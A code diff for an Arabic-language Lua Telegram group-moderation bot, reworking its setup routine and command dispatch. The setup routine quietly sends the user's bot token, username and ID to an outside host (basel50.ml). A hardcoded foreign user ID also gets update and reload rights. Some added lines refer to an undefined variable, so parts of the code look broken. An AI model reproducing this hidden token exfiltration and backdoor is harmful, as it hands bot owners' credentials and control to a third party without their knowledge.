@@ -1,94 +1,86 @@
 
 
-local function download(file_id, dl_cb, cmd)
-  tdcli_function ({
-    ID = "DownloadFile",
-    file_id_ = file_id
-  }, dl_cb, cmd)
-end
 
-
-Er_cjson , JSON  = pcall(require, "cjson")
 Er_ssl   , https = pcall(require, "ssl.https")
-Er_url   , URL   = pcall(require, "socket.url")
 Er_http  , http  = pcall(require, "socket.http")
-Er_utf8  , utf8  = pcall(require, "lua-utf8")
-Er_redis , redis = pcall(require, "redis")
-json  = dofile('./inc/JSON.lua')
-redis = redis.connect('127.0.0.1',6379)
 http.TIMEOUT = 5
+JSON   = (loadfile "./libs/json.lua")()
+redis  = (loadfile "./libs/redis.lua")()
+URL    = (loadfile "./libs/url.lua")()
+Er_utf8  , utf8  = pcall(require, "lua-utf8")
+redis = redis.connect('127.0.0.1',6379)
 
-if not Er_cjson then
-print("('\n\27[1;31m￤Pkg _ Cjson is Not installed.'\n\27[0m￤")
+
+
+if not Er_ssl then
+print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
 os.exit()
 end
-if not Er_http then
-print("('\n\27[1;31m￤Pkg _ luaSec - https  is Not installed.'\n\27[0m￤")
-os.exit()
-end
-if not Er_url then
-print("('\n\27[1;31m￤Pkg _ Lua-cURL  is Not installed.'\n\27[0m￤")
-os.exit()
-end
-if not Er_redis then
-print("('\n\27[1;31m￤Pkg _ redis-lua is Not installed.'\n\27[0m￤")
-os.exit()
-end
+
 if not Er_utf8 then
 print("('\n\27[1;31m￤Pkg >> UTF_8 is Not installed.'\n\27[0m￤")
-os.execute("sudo luarocks install luautf8")
 os.exit()
 end
-
 
 function create_config(Token)
 if not Token then
 io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
 Token = io.read():gsub(' ','')
 if Token == '' then
-print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توكن آلبوت آلآن ')
+print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توگن آلبوت آلآن ')
 create_config()
 end
 Api_Token = 'https://api.telegram.org/bot'..Token
 local url , res = https.request(Api_Token..'/getMe')
 if res ~= 200 then
-print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوكن آلذي آدخلتهہ‏‏ غير صـحيح , تآكد مـنهہ‏‏ ثم حآول مـجددآ!')
+print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوگن آلذي آدخلتهہ‏‏ غير صـحيح , تآگد مـنهہ‏‏ ثم حآول مـجددآ!')
 create_config()
 end
 local GetToken = JSON.decode(url)
 BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
-io.write('\n\27[1;36m￤تم آدخآل آلتوكن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
+io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
-io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
+
+io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your ID SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
+print('\n\27[1;31m￤ You Did not Enter ID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
 create_config(Token)
 end 
 if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
-print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلكرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
+print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
 create_config(Token)
 end 
 print('('..SUDO_USER..')')
 local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
-GetUser = json:decode(url)
+print(res)
 if res ~= 200 then
+print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+os.exit()
+end
+success, GetUser = pcall(JSON.decode, url)
+if not success then
+print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+os.exit()
 end
 if GetUser.ok == false then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـكن مـن حل آلمـشـكلهہ‏‏ في آسـرع وقت مـمـكن . !')
+print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلايدي , تآگد مـنهہ‏‏ جيدآ  !')
 create_config(Token)
-end
+end 
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
-ws = Token:match("(%d+)")
-redis:set(ws..":VERSION",1)
-redis:set(ws..":SUDO_ID:",SUDO_USER)
-redis:set(ws..":DataCenter:",'German')
-redis:set(ws..":UserNameBot:",BOT_User)
-redis:set(ws..":NameBot:",BOT_NAME)
-redis:hset(ws..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
-redis:set("TH3ws_INSTALL","Yes")
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل سورس دروك الآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
+boss = Token:match("(%d+)")
+redis:mset(
+boss..":VERSION","1.0",
+boss..":SUDO_ID:",SUDO_USER,
+boss..":DataCenter:","Amsterdam",
+boss..":UserNameBot:",BOT_User,
+boss..":ApiSource","SourceMilan",
+boss..":NameBot:","دروك",
+"TH3BOSS_INSTALL","Yes"
+)
+redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
 info.namebot = BOT_NAME
 info.userbot = BOT_User
@@ -96,19 +88,23 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://Mic/Susj.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
+https.request('https://basel50.ml/Aaaaaa.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس ميلآن \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+local Text = " اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n شكرا لاستخدامك سورس مـيـلآن \n أرســل  الان /start\n لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-os.execute([[
+local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-./run
-]])
+cp -a ../abaza ../]]..BOT_User..[[ &&
+rm -fr ~/abaza
+../]]..BOT_User..[[/run
+]]
+print(CmdRun)
+os.execute(CmdRun)
 end
 
 function Start_Bot() 
@@ -120,13 +116,11 @@ print('\27[0;33m>>'..[[
 
 
 
-▀█████████▄           ██       ████████
-
-  ███    ███ ███          ██               ██             ██                   ██
-▄█████████▀           ██               ██             ██                    ██▄████████▀ │Milan ﹏ @XB0BB
+▀
+▄█████████▀           ██               ██             ██                    ██▄████████▀ │BATSHIKO ﹏ @VV_0M
 │
-تم  وبرمجة السورس من قبل معتز خالد
-│@XB0BB
+تم تطوير وبرمجة السورس من قبل معتز خالد
+│@VV_0M
                                         
                                         
 ---------------------------------------------------------------------
@@ -166,13 +160,11 @@ print('\27[0;33m>>'..[[
 
 
 
-▀█████████▄           ██       ████████
-
-  ███    ███ ███          ██               ██             ██                   ██
-▄█████████▀           ██               ██             ██                    ██▄████████▀ │Milan ﹏ @XB0BB
+▀
+▄█████████▀           ██               ██             ██                    ██▄████████▀ │BATSHIKO ﹏ @VV_0M
 │
-تم  وبرمجة السورس من قبل معتز خالد
-│@XB0BB
+تم تطوير وبرمجة السورس من قبل معتز خالد
+│@VV_0M
                                                                               
 -------------------------------------------------------------------
 
@@ -492,16 +484,16 @@ return false
 end 
 end 
 
-if ScriptFile and ScriptFile.amrko then 
-if msg.text and ScriptFile.iamrko then
-Xamrko = ScriptFile.amrko
-local list = redis:hgetall(amrko..":AwamerBotArray:"..msg.chat_id_)
-for amrko2,k in pairs(list) do
+if ScriptFile and ScriptFile.Boss then 
+if msg.text and ScriptFile.iBoss then
+XBoss = ScriptFile.Boss
+local list = redis:hgetall(boss..":AwamerBotArray:"..msg.chat_id_)
+for Boss2,k in pairs(list) do
 Text = msg.text
 Text2 = k
-if Text:match(amrko2) then 
-local amrr = {Text:match(amrko2)}
-local AmrOld = redis:hgetall(amrko..":AwamerBotArray2:"..msg.chat_id_)
+if Text:match(Boss2) then 
+local amrr = {Text:match(Boss2)}
+local AmrOld = redis:hgetall(boss..":AwamerBotArray2:"..msg.chat_id_)
 amrnew = "" amrold = ""
 for Amor,ik in pairs(AmrOld) do
 if Text2:match(ik) then	
@@ -509,7 +501,10 @@ if amrr[1] == Amor then
 amrnew = Amor ; amrold = ik   
 end end end
 Text = Text:gsub(amrnew,amrold)
-GetMsg = ScriptFile.iamrko(msg,{Text:match(Text2)})
+AF = CheckBotA(msg) if AF then 
+local AFinline = {{{text=" آشـترك بـالـقـنـاة",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
+GetMsg = ScriptFile.iBoss(msg,{Text:match(Text2)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
@@ -517,105 +512,73 @@ return false
 end 
 end
 end
-for k, amrko in pairs(Xamrko) do
+for k, Boss in pairs(XBoss) do
 Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
-if Text:match(amrko) then -- Check Commands To admin
-GetMsg = ScriptFile.iamrko(msg,{Text:match(amrko)})
+if Text:match(Boss) then -- Check Commands To admin
+AF = CheckBotA(msg) if AF then 
+local AFinline = {{{text=" آشـترك بـالـقـنـاة",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
+GetMsg = ScriptFile.iBoss(msg,{Text:match(Boss)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",amrko.." | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
 end
 end
-end  --- End iamrko
-if ScriptFile.damrko then
-if ScriptFile.damrko(msg) == false then
+end  --- End iBoss
+if ScriptFile.dBoss then
+if ScriptFile.dBoss(msg) == false then
 return false
 end
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
 
 for name,Plug in pairs(File) do
-if Plug.amrko then 
-if msg.text and Plug.iamrko then
-for k, amrko in pairs(Plug.amrko) do
-if msg.text:match(amrko) then
-local GetMsg = Plug.iamrko(msg,{msg.text:match(amrko)})
+if Plug.Boss then 
+if msg.text and Plug.iBoss then
+for k, Boss in pairs(Plug.Boss) do
+if msg.text:match(Boss) then
+local GetMsg = Plug.iBoss(msg,{msg.text:match(Boss)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",amrko.." | Plugin is: \27[1;32m"..name.."\27[0m")
+print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32m"..name.."\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 end 
 return false
 end
 end
 end
-if Plug.damrko then
-Plug.damrko(msg)
+if Plug.dBoss then
+Plug.dBoss(msg)
 print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
 end
 else
-print("The File "..name.." Not Runing in The Source amrko")
+print("The File "..name.." Not Runing in The Source Boss")
 end 
 
 end
 else
-print("The File Script.lua Not Runing in The Source amrko")
+print("The File Script.lua Not Runing in The Source Boss")
 end
 end
 
 function tdcli_update_callback(data)
-local msg = data.message_
+iio = 0
+msg = data.message_
 if data.ID == "UpdateMessageSendFailed" then 
 if msg and msg.sender_user_id_ then
-redis:srem(amrko..'users',msg.sender_user_id_)
+redis:srem(boss..'users',msg.sender_user_id_)
 end
 elseif data.ID == "UpdateNewCallbackQuery" then
-local datab = data.payload_.data_ 
-local UserID = data.sender_user_id_
-local ChatID = data.chat_id_
-local dataid = data.message_id_
-
-local Text,UserJoin = datab:match("^(CheckRobotJoin:)(%d+)$")
-local UserJoin = tonumber(UserJoin)
-if Text == "CheckRobotJoin:" then
-local Adminn = false
-if UserID == SUDO_ID then 
-Adminn = true
-elseif redis:sismember(amrko..':SUDO_BOT:',UserID) then 
-Adminn = true
-elseif redis:sismember(amrko..':MONSHA_BOT:'..ChatID,UserID) then 
-Adminn = true
-elseif redis:sismember(amrko..':MONSHA_Group:'..ChatID,UserID) then 
-Adminn = true
-elseif redis:sismember(amrko..'owners:'..ChatID,UserID) then 
-Adminn = true
-elseif redis:sismember(amrko..'admins:'..ChatID,UserID) then 
-Adminn = true
-elseif UserID == UserJoin then 
-Adminn = true
-end	
-if Adminn then
-Restrict(ChatID,UserJoin,2)
-answerCallbackQuery(data.id_,"• تم فك التقييد بنجاح والتأكد بانك لست روبوت",true)
-EditMsg(ChatID,dataid,"• تم فك التقييد بنجاح والتأكد بانك لست روبوت")
-else
-answerCallbackQuery(data.id_,"عذرا انت لست الشخص المقيد او لا يوجد لديك صلاحيه الادارة , نعتذر منك",true)	
-end
-
-else
---	answerCallbackQuery(data.id_,"امر غير معرف",true)
-end
-
-
+UpdateNewQuery(data)
 elseif data.ID == "UpdateMessageSendSucceeded" then
 local msg = data.message_
 if msg.content_.text_ then
-if redis:get(amrko..":propin"..msg.chat_id_) == msg.content_.text_ then
-redis:del(amrko..":propin"..msg.chat_id_)
+if redis:get(boss..":propin"..msg.chat_id_) == msg.content_.text_ then
+redis:del(boss..":propin"..msg.chat_id_)
 tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) end,nil)   
 end
 
@@ -627,7 +590,7 @@ return false
 end 
 if UpdateSourceStart then
 UpdateSourceStart = false
-UpdateSource(msg,true)
+--UpdateSource(msg,true)
 end
 elseif data.ID == "UpdateNewMessage" then
 if msg.content_.ID == "MessageText" then
@@ -646,20 +609,20 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131 or msg.sender_user_id_ == 1836706131) then
-return sendMsg(msg.chat_id_,msg.id_,"• تم تحديث الملفات",function(arg,data)
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131) then
+return sendMsg(msg.chat_id_,msg.id_," تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 332717942 or msg.sender_user_id_ == 332717942) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131) then
 UpdateSource(msg)
-sendMsg(msg.chat_id_,msg.id_,'• {* تــم تحديث وتثبيت السورس  *}.\n\n• { Bot is Update » }',function(arg,data)
+sendMsg(msg.chat_id_,msg.id_,' {* تــم تحديث وتثبيت السورس  *} .\n\n { Bot is Update » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131 or msg.sender_user_id_ == 1836706131) then
-sendMsg(msg.chat_id_,msg.id_,'• {* تــم أعـاده تشغيل البوت  *}.\n\n• { Bot is Reloaded » }',function(arg,data)
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل ") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1836706131) then
+sendMsg(msg.chat_id_,msg.id_,' {* تــم أعـاده تشغيل البوت  *} .\n\n| { Bot is Reloaded » }',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end)
@@ -669,17 +632,17 @@ end
 input_inFo(msg)
 
 elseif data.ID == "UpdateNewChat" then  
-if redis:get(amrko..'group:add'..data.chat_.id_) then
-redis:set(amrko..'group:name'..data.chat_.id_,data.chat_.title_)
+if redis:get(boss..'group:add'..data.chat_.id_) then
+redis:set(boss..'group:name'..data.chat_.id_,data.chat_.title_)
 end
 elseif data.ID == "UpdateChannel" then  
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
-if redis:get(amrko..'group:add-100'..data.channel_.id_) then
-local linkGroup = (redis:get(amrko..'linkGroup-100'..data.channel_.id_) or "")
-local NameGroup = (redis:get(amrko..'group:name-100'..data.channel_.id_) or "")
-send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
-rem_data_group('-100'..data.channel_.id_)
-end
+if redis:get(boss..'group:add-100'..data.channel_.id_) then
+local linkGroup = (redis:get(boss..'linkGroup-100'..data.channel_.id_) or "")
+local NameGroup = (redis:get(dany..'group:name-100'..data.channel_.id_) or "")
+	send_msg(SUDO_ID,"• قام شخص بطرد البوت من المجموعه الاتيه : \n• ألايدي : `-100"..data.channel_.id_.."`\n• الـمجموعه : "..Flter_Markdown(NameGroup).."\n\n• تـم مسح كل بيانات المجموعه بنـجاح ")
+	rem_data_group('-100'..data.channel_.id_)
+	end
 end
 elseif data.ID == "UpdateFile" then 
 if Uploaded_Groups_Ok then
@@ -688,34 +651,34 @@ local GetInfo = io.open(data.file_.path_, "r"):read('*a')
 local All_Groups = JSON.decode(GetInfo)
 for k,IDS in pairs(All_Groups.Groups) do
 redis:mset(
-amrko..'group:name'..k,IDS.Title,
-amrko..'num_msg_max'..k,5,
-amrko..'group:add'..k,true,
-amrko..'lock_link'..k,true,
-amrko..'lock_spam'..k,true,
-amrko..'lock_webpage'..k,true,
-amrko..'lock_markdown'..k,true,
-amrko..'lock_flood'..k,true,
-amrko..'lock_bots'..k,true,
-amrko..'mute_forward'..k,true,
-amrko..'mute_contact'..k,true,
-amrko..'mute_document'..k,true,
-amrko..'mute_inline'..k,true,
-amrko..'lock_username'..k,true,
-amrko..'replay'..k,true
+boss..'group:name'..k,IDS.Title,
+boss..'num_msg_max'..k,5,
+boss..'group:add'..k,true,
+boss..'lock_link'..k,true,
+boss..'lock_spam'..k,true,
+boss..'lock_webpage'..k,true,
+boss..'lock_markdown'..k,true,
+boss..'lock_flood'..k,true,
+boss..'lock_bots'..k,true,
+boss..'mute_forward'..k,true,
+boss..'mute_contact'..k,true,
+boss..'mute_document'..k,true,
+boss..'mute_inline'..k,true,
+boss..'lock_username'..k,true,
+boss..'replay'..k,true
 )
-redis:sadd(amrko..'group:ids',k) 
+redis:sadd(boss..'group:ids',k) 
 
 if IDS.Admins then
 for user,ID in pairs(IDS.Admins) do
-redis:hset(amrko..'username:'..ID,'username',user)
-redis:sadd(amrko..'admins:'..k,ID)
+redis:hset(boss..'username:'..ID,'username',user)
+redis:sadd(boss..'admins:'..k,ID)
 end
 end
 if IDS.Creator then
 for user,ID in pairs(IDS.Creator) do
-redis:hset(amrko..'username:'..ID,'username',user)
-redis:sadd(amrko..':MONSHA_BOT:'..k,ID)
+redis:hset(boss..'username:'..ID,'username',user)
+redis:sadd(boss..':MONSHA_BOT:'..k,ID)
 end
 end
 if IDS.Owner then
@@ -726,12 +689,12 @@ end
 end
 end
 io.popen("rm -fr ../.telegram-cli/data/document/*")
-sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,' تم رفع آلنسـخهہ‏‏ آلآحتيآطـيهہ\n حآليآ عدد مـجمـوعآتگ هہ‏‏يهہ‏‏ *'..redis:scard(boss..'group:ids')..'* \n')
-end
+	sendMsg(Uploaded_Groups_CH,Uploaded_Groups_MS,'⌔︙ ** تم رفع النسخه‏‏ الاحتياطيه\n⌔︙ ** حالياً عدد مجموعاتك هيه‏ *'..redis:scard(dany..'group:ids')..' .*\n')
+	end
 elseif data.ID == "UpdateUser" then  
 if data.user_.type_.ID == "UserTypeDeleted" then
 print("¦ userTypeDeleted")
-redis:srem(amrko..'users',data.user_.id_)
+redis:srem(boss..'users',data.user_.id_)
 elseif data.user_.type_.ID == "UserTypeGeneral" then
 local CheckUser = redis:hgetall(boss..'username:'..data.user_.id_).username
 if data.user_.username_  then 
@@ -741,7 +704,7 @@ USERNAME = data.user_.first_name_..' '..(data.user_.last_name_ or "" )
 end	
 if CheckUser and CheckUser ~= USERNAME  then
 print("¦ Enter Update User ")
-redis:hset(amrko..'username:'..data.user_.id_,'username',USERNAME)
+redis:hset(boss..'username:'..data.user_.id_,'username',USERNAME)
 end 
 end
 elseif data.ID == "UpdateMessageEdited" then
@@ -752,7 +715,7 @@ msg.text = data.content_.text_
 input_inFo(msg)  
 end,nil)
 elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
-UpdateSource() dofile("./inc/Run.lua")
+--UpdateSource() dofile("./inc/Run.lua")
 tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
 end
 
